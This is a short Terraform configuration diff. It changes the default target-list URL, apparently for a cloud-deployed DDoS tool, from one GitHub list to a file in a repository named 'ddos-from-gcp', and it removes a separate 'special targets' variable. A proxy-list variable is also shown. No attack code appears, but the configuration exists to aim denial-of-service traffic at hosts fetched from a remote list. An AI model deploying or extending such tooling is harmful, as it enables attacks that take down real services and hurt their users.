@@ -19,12 +19,8 @@ variable "os_type" {
 
 variable "targets_file_url" {
   type    = string
-  default = "https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt"
-}
-
-variable "special_targets_file_url" {
-  type    = string
-  default = "https://raw.githubusercontent.com/hem017/cytro/master/special_targets.txt"
+  # default = "https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt"
+  default = "https://raw.githubusercontent.com/sonofukraine86/ddos-from-gcp/master/targets.txt"
 }
 
 variable "proxy_file_url" {
